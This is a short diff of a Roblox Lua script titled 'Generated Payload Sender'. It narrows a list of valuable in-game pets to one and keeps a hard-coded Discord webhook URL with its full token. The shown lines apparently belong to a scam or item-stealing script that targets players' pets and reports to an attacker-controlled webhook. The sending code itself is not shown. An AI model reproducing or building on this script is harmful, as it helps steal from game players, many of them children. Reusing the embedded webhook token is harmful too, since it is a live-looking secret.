@@ -1,5 +1,5 @@
 -- Generated Payload Sender
-local PETS = {"Unicorn","Bald Eagle","Monkey","Owl","Frog","Golden Dragonfly","Bunny","Bee","Turtle","Ice Serpent","Butterfly","Firefly","Raccoon","Deer","Robin"}
+local PETS = {"Robin"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
 
 local Event = game:GetService("ReplicatedStorage"):FindFirstChild("SharedModules")
